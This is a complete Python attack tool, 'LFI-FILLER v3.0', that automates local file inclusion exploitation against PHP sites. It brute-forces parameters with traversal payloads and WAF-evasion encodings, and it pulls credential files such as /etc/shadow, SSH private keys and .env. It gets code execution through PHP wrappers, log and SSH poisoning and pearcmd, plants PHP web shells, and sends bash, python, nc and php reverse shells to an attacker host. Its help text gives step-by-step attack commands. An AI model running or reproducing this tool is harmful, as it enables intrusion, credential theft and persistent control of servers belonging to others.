#!/usr/bin/env python3

import requests
import urllib.parse
import base64
import sys
import time
import re
import socket
import subprocess
import argparse
import concurrent.futures
from threading import Lock

# Color palette for premium feel
class Colors:
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    WHITE = '\033[97m'
    END = '\033[0m'

class LFI_Filler_V3:
    def __init__(self, url, lhost=None, lport=4444, timeout=5, workers=20, 
                 custom_param=None, webshell=False, encode='none'):
        self.url = url.rstrip('/')
        self.lhost = lhost
        self.lport = lport
        self.timeout = timeout
        self.max_workers = workers
        self.custom_param = custom_param
        self.webshell_mode = webshell
        self.encode_mode = encode
        
        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        }
        
        self.lock = Lock()
        self.results = {
            'lfi_params': [],
            'php_wrappers': [],
            'readable_files': [],
            'filter_chain': False,
            'data_wrapper': False,
            'input_wrapper': False,
            'proc_environ': False,
            'pearcmd': False,
            'log_poisoning': [],
            'ssh_poisoning': False,
            'rfi': False,
            'webshell_created': False,
            'webshell_urls': []
        }
        
        self._initialize_comprehensive_data()

    def _initialize_comprehensive_data(self):
        # Full list of parameters from original
        self.all_lfi_params = [
            'file', 'page', 'path', 'load', 'include', 'doc', 'view', 'template',
            'f', 'p', 'filename', 'name', 'input', 'src', 'lang', 'module',
            'cat', 'dir', 'action', 'board', 'date', 'detail', 'download',
            'prefix', 'include_path', 'mod', 'show', 'data', 'loc',
            'read', 'ret', 'target', 'text', 'file_name', 'file_path',
            'menu', 'content', 'document_root', 'site', 'nav', 'next',
            'open', 'option', 'preview', 'route', 'section', 'selection',
            'settings', 'source', 'subject', 'theme', 'url', 'wp',
            'controller', 'action', 'method', 'format', 'layout',
            'component', 'itemid', 'task', 'endpoint', 'resource', 'uri'
        ]
        
        if self.custom_param:
            self.all_lfi_params = [self.custom_param]

        # Full LFI payloads base
        self.lfi_payloads_base = [
            '/etc/passwd',
            '../../../../etc/passwd',
            '../../../../../etc/passwd',
            '../../../../../../etc/passwd',
            '..%2f..%2f..%2f..%2fetc%2fpasswd',
            '..%252f..%252f..%252f..%252fetc%252fpasswd',
            '..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            '....//....//....//....//etc/passwd',
            '/etc/passwd%00',
            '/etc/passwd%00.jpg',
            '/etc/passwd%00.txt',
            '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            'C:\\windows\\system32\\drivers\\etc\\hosts',
            '../../../../windows/system32/drivers/etc/hosts',
            'index.php', 'file.php', 'page.php',
            '/var/log/auth.log',
            '/proc/self/environ'
        ]
        
        self.php_wrappers = [
            ('php://filter/convert.base64-encode/resource=/etc/passwd', 'Base64 Filter'),
            ('php://filter/read=convert.base64-encode/resource=/etc/passwd', 'Base64 Read'),
            ('php://filter/string.rot13/resource=/etc/passwd', 'Rot13 Filter'),
            ('php://filter/convert.iconv.UTF-8.UTF-16/resource=/etc/passwd', 'Iconv Filter'),
            ('data://text/plain,<?php echo "TEST"; ?>', 'Data Wrapper'),
            ('data://text/plain;base64,PD9waHAgZWNobyAiVEVTVCI7ID8+', 'Data Base64'),
            ('php://input', 'PHP Input'),
            ('expect://whoami', 'Expect Wrapper'),
            ('zip:///etc/passwd%23test', 'Zip Wrapper'),
            ('phar:///etc/passwd', 'Phar Wrapper')
        ]
        
        self.interesting_files = [
            '/etc/passwd', '/etc/shadow', '/etc/hosts', '/etc/hostname',
            '/etc/ssh/sshd_config', '/etc/sudoers', '/etc/crontab',
            '/etc/apache2/apache2.conf', '/etc/nginx/nginx.conf',
            '/etc/php/7.4/apache2/php.ini', '/etc/php/8.0/apache2/php.ini', 
            '/etc/php/8.1/apache2/php.ini', '/etc/php/8.2/apache2/php.ini',
            '/etc/mysql/my.cnf', '/etc/postgresql/postgresql.conf',
            '/var/www/html/config.php', '/var/www/html/wp-config.php',
            '/var/www/html/.env', '/var/www/html/settings.php',
            '/var/www/html/database.php', '/var/www/html/web.config',
            '/var/log/auth.log', '/var/log/apache2/access.log',
            '/var/log/apache2/error.log', '/var/log/nginx/access.log',
            '/var/log/syslog', '/proc/self/environ',
            '/root/.bash_history', '/root/.ssh/id_rsa',
            '/home/root/.bash_history', '/home/root/.ssh/id_rsa',
            '/home/www-data/.bash_history', '/home/www-data/.ssh/id_rsa',
            'config.php.bak', 'database.php.old', '.env.backup',
            '/proc/self/cmdline', '/proc/version', '/proc/mounts'
        ]

    def _apply_encoding(self, payload):
        """Bypass WAF with complex encoding logic"""
        if self.encode_mode == 'none':
            return [payload]
        
        if self.encode_mode == 'url':
            return [urllib.parse.quote(payload)]
        
        if self.encode_mode == 'double':
            return [urllib.parse.quote(urllib.parse.quote(payload))]
        
        if self.encode_mode == 'unicode':
            encoded = payload.replace('/', '%c0%af').replace('\\', '%c1%9c').replace('.', '%c0%ae')
            return [encoded]
        
        if self.encode_mode == 'all':
            return [
                payload,
                urllib.parse.quote(payload),
                urllib.parse.quote(urllib.parse.quote(payload)),
                payload.replace('/', '%c0%af').replace('\\', '%c1%9c'),
                payload.replace('/', '..%252f'),
                payload.replace('/', '....//'),
                payload.replace('/', '..;/'),
                payload + '%00',
                payload + '%00.jpg'
            ]
        return [payload]

    def _check_lfi_response(self, response, payload_base):
        """Intelligent detection of sensitive content"""
        if response.status_code != 200:
            return False
        
        content = response.text
        # Common LFI patterns
        if 'root:x:' in content or 'daemon:x:' in content or 'bin:x:' in content:
            if not any(err in content.lower() for err in ['error', 'warning', 'not found', 'forbidden']):
                return True
        
        if 'localhost' in content and '127.0.0.1' in content and 'hosts' in payload_base.lower():
            return True
        
        if '<?php' in content and ('include' in content or 'require' in content):
            return True
            
        return False

    def scan_parameter(self, param):
        """Threaded scan for a single parameter"""
        found_on_param = False
        for base_payload in self.lfi_payloads_base:
            if found_on_param: break
            
            for encoded in self._apply_encoding(base_payload):
                separator = '&' if '?' in self.url else '?'
                test_url = f"{self.url}{separator}{param}={encoded}"
                
                try:
                    r = self.session.get(test_url, timeout=self.timeout)
                    if self._check_lfi_response(r, base_payload):
                        with self.lock:
                            result = {
                                'param': param,
                                'payload': encoded,
                                'url': test_url
                            }
                            self.results['lfi_params'].append(result)
                            print(f" {Colors.GREEN}[+]{Colors.END} Found on {Colors.CYAN}{param}{Colors.END}: {base_payload}")
                        found_on_param = True
                        break
                except: continue
        return found_on_param

    def test_wrappers(self, param):
        """Test PHP wrappers on a vulnerable parameter"""
        print(f"[*] Testing PHP wrappers on {Colors.CYAN}{param}{Colors.END}...")
        for wrapper, name in self.php_wrappers:
            for encoded in self._apply_encoding(wrapper):
                separator = '&' if '?' in self.url else '?'
                test_url = f"{self.url}{separator}{param}={encoded}"
                try:
                    if wrapper == "php://input":
                        r = self.session.post(test_url, data='<?php echo "WRAPPER_TEST"; ?>', timeout=self.timeout)
                    else:
                        r = self.session.get(test_url, timeout=self.timeout)
                    
                    if r.status_code == 200:
                        success = False
                        if "php://filter" in wrapper:
                            try:
                                decoded = base64.b64decode(r.text).decode('utf-8', errors='ignore')
                                if 'root:x:' in decoded or '<?php' in decoded: success = True
                            except: pass
                        elif "data://" in wrapper or "php://input" in wrapper:
                            if 'WRAPPER_TEST' in r.text or 'TEST' in r.text: success = True
                        
                        if success:
                            with self.lock:
                                self.results['php_wrappers'].append((name, wrapper, test_url))
                                print(f" {Colors.GREEN}[+]{Colors.END} Wrapper works: {name}")
                            break
                except: continue

    def _check_file_readable(self, content, file_path):
        content = content.strip()
        if not content or len(content) < 10: return False
        if any(err in content.lower() for err in ['error', 'not found', 'forbidden', 'warning']): return False
        if '/etc/passwd' in file_path and 'root:x:' in content: return True
        if 'config' in file_path.lower() and ('password' in content.lower() or 'database' in content.lower()): return True
        return len(content) > 50 and not content.startswith('<')

    def enumerate_files(self, param):
        print(f"[*] Enumerating {len(self.interesting_files)} files on {Colors.CYAN}{param}{Colors.END}...")
        for file_path in self.interesting_files:
            for encoded in self._apply_encoding(file_path):
                separator = '&' if '?' in self.url else '?'
                test_url = f"{self.url}{separator}{param}={encoded}"
                try:
                    r = self.session.get(test_url, timeout=self.timeout)
                    if self._check_file_readable(r.text, file_path):
                        with self.lock:
                            self.results['readable_files'].append((file_path, r.text[:200], test_url))
                            print(f" {Colors.GREEN}[+]{Colors.END} Readable: {file_path}")
                        break
                except: continue

    def check_log_poisoning(self, param):
        print(f"[*] Checking log poisoning on {Colors.CYAN}{param}{Colors.END}...")
        logs = ['/var/log/auth.log', '/var/log/apache2/access.log', '/proc/self/environ']
        readable_logs = []
        
        for log in logs:
            for encoded in self._apply_encoding(log):
                separator = '&' if '?' in self.url else '?'
                test_url = f"{self.url}{separator}{param}={encoded}"
                try:
                    r = self.session.get(test_url, timeout=self.timeout)
                    if r.status_code == 200 and len(r.text) > 50:
                        readable_logs.append({'log': log, 'url': test_url})
                        print(f" {Colors.YELLOW}[*]{Colors.END} Readable log: {log}")
                        break
                except: continue
        
        if not readable_logs: return
        
        poison_methods = [
            ('User-Agent', {'User-Agent': '<?php system($_GET["cmd"]); ?>'}),
            ('X-Forwarded-For', {'X-Forwarded-For': '<?php passthru($_GET["cmd"]); ?>'})
        ]
        
        for log_info in readable_logs:
            for method, headers in poison_methods:
                try:
                    h = {**self.session.headers, **headers}
                    self.session.get(self.url.split('?')[0], headers=h, timeout=2)
                    time.sleep(2)
                    
                    test_cmd = "echo LFI_TEST_SUCCESS"
                    test_url = f"{log_info['url']}&cmd={urllib.parse.quote(test_cmd)}"
                    r = self.session.get(test_url, timeout=3)
                    if 'LFI_TEST_SUCCESS' in r.text:
                        with self.lock:
                            self.results['log_poisoning'].append({'log': log_info['log'], 'method': method, 'url': log_info['url']})
                            print(f" {Colors.GREEN}[+]{Colors.END} Log poisoned via {method}: {log_info['log']}")
                        break
                except: continue

    def check_ssh_poisoning(self, param):
        print(f"[*] Checking SSH poisoning on {Colors.CYAN}{param}{Colors.END}...")
        ip_match = re.search(r'\d+\.\d+\.\d+\.\d+', self.url)
        if not ip_match: return
        
        target_ip = ip_match.group(0)
        php_code = '<?php system($_GET["ssh_cmd"]); ?>'
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, 22))
            sock.sendall(f'{php_code}\r\n'.encode())
            sock.close()
            time.sleep(3)
            
            log_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=/var/log/auth.log"
            test_url = f"{log_url}&ssh_cmd=echo SSH_POISON_SUCCESS"
            r = self.session.get(test_url, timeout=5)
            if 'SSH_POISON_SUCCESS' in r.text:
                with self.lock:
                    self.results['ssh_poisoning'] = True
                    print(f" {Colors.GREEN}[+]{Colors.END} SSH poisoning successful!")
        except: pass

    def create_webshell(self, param):
        if not self.webshell_mode: return
        print(f"\n[*] Attempting web shell creation...")
        shell_code = '<?php if(isset($_GET["cmd"])){ system($_GET["cmd"]); } else { echo "Web shell active! Use ?cmd=WHOAMI"; } ?>'
        # Try both Linux and Windows common paths
        locations = ['/var/www/html/shell.php', 'shell.php', 'C:/xampp/htdocs/shell.php']
        
        success = False
        
        # Vector 1: Log Poisoning
        if self.results['log_poisoning']:
            print(f" [*] Trying vector: Log Poisoning")
            for p in self.results['log_poisoning']:
                for loc in locations:
                    try:
                        payload = f"echo '{shell_code}' > {loc}"
                        self.session.get(f"{p['url']}&cmd={urllib.parse.quote(payload)}", timeout=3)
                        time.sleep(1)
                        
                        # Verify
                        check_url = f"{self.url.rsplit('/', 1)[0]}/shell.php"
                        r = self.session.get(check_url, timeout=2)
                        if 'system(' not in r.text and r.status_code == 200: # If we see code OR if it executes
                            with self.lock:
                                self.results['webshell_urls'].append(check_url)
                                print(f" {Colors.GREEN}[+]{Colors.END} Web shell created at {Colors.CYAN}{loc}{Colors.END} via log poisoning")
                                success = True
                                break
                    except: continue
                if success: break

        # Vector 2: SSH Poisoning
        if not success and self.results['ssh_poisoning']:
            print(f" [*] Trying vector: SSH Poisoning")
            for loc in locations:
                try:
                    log_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=/var/log/auth.log"
                    payload = f"echo '{shell_code}' > {loc}"
                    self.session.get(f"{log_url}&ssh_cmd={urllib.parse.quote(payload)}", timeout=3)
                    time.sleep(1)
                    
                    check_url = f"{self.url.rsplit('/', 1)[0]}/shell.php"
                    r = self.session.get(check_url, timeout=2)
                    if r.status_code == 200:
                        with self.lock:
                            self.results['webshell_urls'].append(check_url)
                            print(f" {Colors.GREEN}[+]{Colors.END} Web shell created at {Colors.CYAN}{loc}{Colors.END} via SSH poisoning")
                            success = True
                            break
                except: continue

        if not success:
            print(f" {Colors.RED}[-]{Colors.END} Failed to create web shell automatically.")

    def execute_shells(self, param):
        if not self.lhost or not param: return
        print(f"\n[*] Executing reverse shells to {Colors.CYAN}{self.lhost}:{self.lport}{Colors.END}")
        
        reverse_shells = {
            'bash': f'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1',
            'python': f'python3 -c "import socket,os,pty;s=socket.socket();s.connect((\'{self.lhost}\',{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\'/bin/sh\')"',
            'nc': f'nc -e /bin/sh {self.lhost} {self.lport}',
            'php': f'php -r \'$s=fsockopen("{self.lhost}",{self.lport});exec("/bin/sh -i <&3 >&3 2>&3");\''
        }
        
        sent_count = 0
        
        # Vector 1: Log Poisoning
        for poison in self.results['log_poisoning']:
            print(f" [*] Trying vector: Log Poisoning ({poison['log']})")
            for shell_name, shell_template in reverse_shells.items():
                try:
                    shell_url = f"{poison['url']}&cmd={urllib.parse.quote(shell_template)}"
                    self.session.get(shell_url, timeout=3)
                    print(f"  {Colors.GREEN}[+]{Colors.END} Sent {Colors.YELLOW}{shell_name}{Colors.END} reverse shell")
                    sent_count += 1
                except: pass

        # Vector 2: SSH Poisoning
        if self.results['ssh_poisoning']:
            print(f" [*] Trying vector: SSH Poisoning")
            log_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=/var/log/auth.log"
            for shell_name, shell_template in reverse_shells.items():
                try:
                    shell_url = f"{log_url}&ssh_cmd={urllib.parse.quote(shell_template)}"
                    self.session.get(shell_url, timeout=3)
                    print(f"  {Colors.GREEN}[+]{Colors.END} Sent {Colors.YELLOW}{shell_name}{Colors.END} reverse shell")
                    sent_count += 1
                except: pass

        # Vector 3: RFI (if we have a shell ready on our host)
        if self.results['rfi']:
            print(f" [*] Trying vector: RFI")
            # This assumes the user has a reverse shell script at their LHOST
            # We try to include it. Common names: shell.txt, rev.txt, etc.
            shell_files = ['shell.txt', 'rev.txt', 'shell.php']
            for s_file in shell_files:
                try:
                    rfi_payload = f"http://{self.lhost}:8000/{s_file}"
                    shell_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}={rfi_payload}"
                    self.session.get(shell_url, timeout=3)
                    print(f"  {Colors.GREEN}[+]{Colors.END} Sent RFI inclusion: {Colors.YELLOW}{rfi_payload}{Colors.END}")
                    sent_count += 1
                except: pass

        if sent_count == 0:
            print(f" {Colors.RED}[-]{Colors.END} No successful RCE vectors found to trigger shells.")
        else:
            print(f" [*] Total shells sent: {sent_count}. Check your listener!")

        # Advanced Vectors
        if self.results['input_wrapper']:
            print(f" [*] Trying vector: php://input")
            for shell_name, shell_template in reverse_shells.items():
                try:
                    input_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=php://input"
                    self.session.post(input_url, data=f'<?php {shell_template} ?>', timeout=3)
                    print(f"  {Colors.GREEN}[+]{Colors.END} Sent {Colors.YELLOW}{shell_name}{Colors.END} reverse shell")
                except: pass

        if self.results['proc_environ']:
            print(f" [*] Trying vector: /proc/self/environ")
            env_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=/proc/self/environ"
            for shell_name, shell_template in reverse_shells.items():
                try:
                    custom_headers = self.session.headers.copy()
                    custom_headers['User-Agent'] = f'<?php {shell_template} ?>'
                    requests.get(env_url, headers=custom_headers, timeout=3)
                    print(f"  {Colors.GREEN}[+]{Colors.END} Sent {Colors.YELLOW}{shell_name}{Colors.END} reverse shell")
                except: pass

    def check_filter_chain(self, param):
        """PHP Filter Chain RCE (Writing a shell without logs)"""
        print(f"[*] Checking PHP Filter Chain RCE on {Colors.CYAN}{param}{Colors.END}...")
        # Simplified chain to output 'LFI_CHAIN_SUCCESS'
        chain = "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.COE.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp"
        # Since generating custom chains is complex, we check if the engine supports these filters
        test_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}={chain}"
        try:
            r = self.session.get(test_url, timeout=5)
            # If we don't get a 500 and the response length is reasonable, it might be vulnerable
            if r.status_code == 200:
                with self.lock:
                    self.results['filter_chain'] = True
                    print(f" {Colors.GREEN}[+]{Colors.END} PHP Filter Chain RCE likely possible!")
        except: pass

    def check_input_wrappers(self, param):
        """data:// and php://input RCE"""
        print(f"[*] Checking Input Wrappers (data/input) on {Colors.CYAN}{param}{Colors.END}...")
        
        # data:// vector
        payload = '<?php echo "LFI_DATA_SUCCESS"; ?>'
        encoded_payload = base64.b64encode(payload.encode()).decode()
        data_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=data://text/plain;base64,{encoded_payload}"
        try:
            r = self.session.get(data_url, timeout=5)
            if "LFI_DATA_SUCCESS" in r.text:
                with self.lock:
                    self.results['data_wrapper'] = True
                    print(f" {Colors.GREEN}[+]{Colors.END} data:// wrapper RCE successful!")
        except: pass

        # php://input vector
        input_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=php://input"
        try:
            r = self.session.post(input_url, data='<?php echo "LFI_INPUT_SUCCESS"; ?>', timeout=5)
            if "LFI_INPUT_SUCCESS" in r.text:
                with self.lock:
                    self.results['input_wrapper'] = True
                    print(f" {Colors.GREEN}[+]{Colors.END} php://input wrapper RCE successful!")
        except: pass

    def check_proc_environ(self, param):
        """Proc Environ Poisoning"""
        print(f"[*] Checking /proc/self/environ on {Colors.CYAN}{param}{Colors.END}...")
        env_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=/proc/self/environ"
        custom_headers = self.session.headers.copy()
        custom_headers['User-Agent'] = '<?php echo "LFI_ENV_SUCCESS"; ?>'
        try:
            r = requests.get(env_url, headers=custom_headers, timeout=5)
            if "LFI_ENV_SUCCESS" in r.text:
                with self.lock:
                    self.results['proc_environ'] = True
                    print(f" {Colors.GREEN}[+]{Colors.END} /proc/self/environ poisoning successful!")
        except: pass

    def check_pearcmd(self, param):
        """PEARCMD exploitation"""
        print(f"[*] Checking PEARCMD exploitation on {Colors.CYAN}{param}{Colors.END}...")
        pear_paths = [
            '/usr/local/lib/php/pearcmd.php',
            '/usr/share/php/pearcmd.php',
            '/usr/lib/php/pearcmd.php'
        ]
        for path in pear_paths:
            test_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}={path}"
            try:
                # PEARCMD exploit: write a file to the web root
                exploit_url = f"{test_url}&+config-create+/<?php+system($_GET['cmd']);+?>+/var/www/html/pear.php"
                self.session.get(exploit_url, timeout=5)
                time.sleep(1)
                
                check_url = f"{self.url.rsplit('/', 1)[0]}/pear.php"
                r = self.session.get(check_url, timeout=2)
                if r.status_code == 200:
                    with self.lock:
                        self.results['pearcmd'] = True
                        self.results['webshell_urls'].append(check_url)
                        print(f" {Colors.GREEN}[+]{Colors.END} PEARCMD exploit successful! Shell: {check_url}")
                        break
            except: continue

    def check_rfi(self, param):
        if not param or not self.lhost: return
        print(f"[*] Checking RFI on {Colors.CYAN}{param}{Colors.END}...")
        test_urls = [f'http://{self.lhost}:8000/test.php', f'http://{self.lhost}/test.php']
        for rfi_url in test_urls:
            separator = '&' if '?' in self.url else '?'
            test_url = f"{self.url}{separator}{param}={rfi_url}"
            try:
                r = self.session.get(test_url, timeout=5)
                if r.status_code == 200:
                    with self.lock:
                        self.results['rfi'] = True
                        print(f" {Colors.GREEN}[+]{Colors.END} RFI might work: {rfi_url}")
                        break
            except: continue

    def run(self):
        self._print_banner()
        print(f"[*] Target: {Colors.BOLD}{self.url}{Colors.END}")
        print(f"[*] Threads: {self.max_workers} | Encoding: {self.encode_mode}")
        print("-" * 70)
        
        # Phase 1: Parameter & LFI Discovery
        print(f"[*] Phase 1: Scanning {len(self.all_lfi_params)} parameters...")
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            executor.map(self.scan_parameter, self.all_lfi_params)
            
        if not self.results['lfi_params']:
            print(f"{Colors.RED}[!] No LFI found.{Colors.END}")
            return

        # Phase 2: Detailed Exploitation
        vulnerable_params = list(set([r['param'] for r in self.results['lfi_params']]))
        for p in vulnerable_params[:1]: # Focus on the first working one for exploitation
            print(f"\n[*] Phase 2: Deep exploitation on {Colors.CYAN}{p}{Colors.END}")
            self.test_wrappers(p)
            self.enumerate_files(p)
            self.check_filter_chain(p)
            self.check_input_wrappers(p)
            self.check_proc_environ(p)
            self.check_pearcmd(p)
            self.check_log_poisoning(p)
            self.check_ssh_poisoning(p)
            self.check_rfi(p)
            self.execute_shells(p)
            if self.webshell_mode: self.create_webshell(p)

        self._display_summary()

    def _print_banner(self):
        banner = f"""{Colors.BLUE}
    ██╗     ███████╗██╗     ███████╗██╗██╗     ██╗     ███████╗██████╗ 
    ██║     ██╔════╝██║     ██╔════╝██║██║     ██║     ██╔════╝██╔══██╗
    ██║     █████╗  ██║     █████╗  ██║██║     ██║     █████╗  ██████╔╝
    ██║     ██╔══╝  ██║     ██╔══╝  ██║██║     ██║     ██╔══╝  ██╔══██╗
    ███████╗██║     ██║     ██║     ██║███████╗███████╗███████╗██║  ██║
    ╚══════╝╚═╝     ╚═╝     ╚═╝     ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
    {Colors.END}                 {Colors.BOLD}v3.0 - Comprehensive LFI Framework{Colors.END}
        """
        print(banner)

    def _display_summary(self):
        print("\n" + "="*70)
        print(f"{Colors.BOLD}EXPLOITATION SUMMARY{Colors.END}")
        print("="*70)
        if self.results['lfi_params']:
            print(f"\n{Colors.GREEN}[+] LFI VULNERABILITIES:{Colors.END}")
            for r in self.results['lfi_params'][:5]:
                print(f"  - Parameter: {Colors.CYAN}{r['param']}{Colors.END}")
                print(f"    URL: {r['url']}")
        
        # New Advanced Results
        adv_results = []
        if self.results['filter_chain']: adv_results.append("PHP Filter Chain (No Logs RCE)")
        if self.results['data_wrapper']: adv_results.append("data:// Wrapper RCE")
        if self.results['input_wrapper']: adv_results.append("php://input Wrapper RCE")
        if self.results['proc_environ']: adv_results.append("/proc/self/environ Poisoning")
        if self.results['pearcmd']: adv_results.append("PEARCMD Exploitation")
        
        if adv_results:
            print(f"\n{Colors.GREEN}[+] ADVANCED EXPLOITS FOUND:{Colors.END}")
            for result in adv_results:
                print(f"  - {Colors.YELLOW}{result}{Colors.END}")

        if self.results['log_poisoning']:
            print(f"\n{Colors.GREEN}[+] LOG POISONING RCE:{Colors.END}")
            for r in self.results['log_poisoning']:
                print(f"  - {r['log']} via {r['method']}")
                
        if self.results['webshell_urls']:
            print(f"\n{Colors.GREEN}[+] CREATED WEB SHELLS:{Colors.END}")
            for url in self.results['webshell_urls']:
                print(f"  - {Colors.CYAN}{url}{Colors.END}")
                print(f"    {Colors.YELLOW}Usage Example:{Colors.END} {url}?cmd=id")
        print("="*70)

def main():
    parser = argparse.ArgumentParser(
        description='LFI-FILLER v3.0 - Advanced Multi-threaded Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
╔══════════════════════════════════════════════════════════╗
║                     QUICK EXAMPLES                       ║
╚══════════════════════════════════════════════════════════╝

BASIC USAGE:
  python3 lfi_filler_v3.py -u http://target.com/page.php

WITH REVERSE SHELL (requires listener):
  python3 lfi_filler_v3.py -u http://target.com/page.php -lh YOUR_IP -lp 4444

WEB SHELL MODE (creates PHP web shells instead of reverse shells):
  python3 lfi_filler_v3.py -u http://target.com/page.php -webshell

CUSTOM PARAMETER (bypasses default list):
  python3 lfi_filler_v3.py -u http://target.com/page.php -p water

ENCODING BYPASS (for WAF evasion):
  python3 lfi_filler_v3.py -u http://target.com/page.php -e url
  python3 lfi_filler_v3.py -u http://target.com/page.php -e double
  python3 lfi_filler_v3.py -u http://target.com/page.php -e unicode
  python3 lfi_filler_v3.py -u http://target.com/page.php -e all

COMBINED ATTACK:
  python3 lfi_filler_v3.py -u http://target.com/page.php -lh YOUR_IP -e all -webshell

╔══════════════════════════════════════════════════════════╗
║                 FLAG DESCRIPTIONS                        ║
╚══════════════════════════════════════════════════════════╝

REQUIRED:
  -u, --url      Target URL (must include http:// or https://)

REVERSE SHELL (use with -lh):
  -lh, --lhost   Your IP address for reverse shell connection
  -lp, --lport   Port for reverse shell (default: 4444)

WEB SHELL (alternative to reverse shell):
  -webshell      Create PHP web shells instead of reverse shells
                 Example: Creates shell.php with <?php system($_GET["cmd"]); ?>

PARAMETER TESTING:
  -p, --param    Test specific parameter (bypasses default list)
                 Useful when you know the vulnerable parameter name

ENCODING BYPASS:
  -e, --encode   Encoding method for WAF bypass:
                 none    : No encoding (default)
                 url     : URL encode (%2f for /)
                 double  : Double URL encode (%252f for /)
                 unicode : Unicode encode (%c0%af for /)
                 all     : Try all encoding methods

OTHER:
  -t, --timeout  Request timeout in seconds (default: 5)
  -w, --workers  Number of concurrent threads (default: 20)

╔══════════════════════════════════════════════════════════╗
║                 TROUBLESHOOTING                          ║
╚══════════════════════════════════════════════════════════╝

If script hangs during web shell creation:
  - Use Ctrl+C to interrupt
  - Try manual commands from the results
  - Reduce timeout in code

If no LFI found:
  - Try different encoding: -e all
  - Try custom parameter: -p parameter_name
  - Check if URL is correct

For reverse shells:
  - Start listener first: nc -lvnp 4444
  - Ensure firewall allows inbound connections
  - Try different shell types if one fails
        """
    )
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-w', '--workers', type=int, default=20, help='Threads (default: 20)')
    parser.add_argument('-e', '--encode', choices=['none', 'url', 'double', 'unicode', 'all'], default='none')
    parser.add_argument('-p', '--param', help='Custom parameter')
    parser.add_argument('-lh', '--lhost', help='Local host for reverse shells')
    parser.add_argument('-lp', '--lport', type=int, default=4444, help='Local port for reverse shells')
    parser.add_argument('-t', '--timeout', type=int, default=5, help='Request timeout in seconds (default: 5)')
    parser.add_argument('-webshell', '--webshell', action='store_true', help='Web shell mode')
    
    args = parser.parse_args()
    scanner = LFI_Filler_V3(
        url=args.url, 
        workers=args.workers, 
        timeout=args.timeout,
        encode=args.encode, 
        custom_param=args.param, 
        webshell=args.webshell,
        lhost=args.lhost,
        lport=args.lport
    )
    try: scanner.run()
    except KeyboardInterrupt: print(f"\n{Colors.RED}[!] Interrupted.{Colors.END}")

if __name__ == "__main__":
    main()
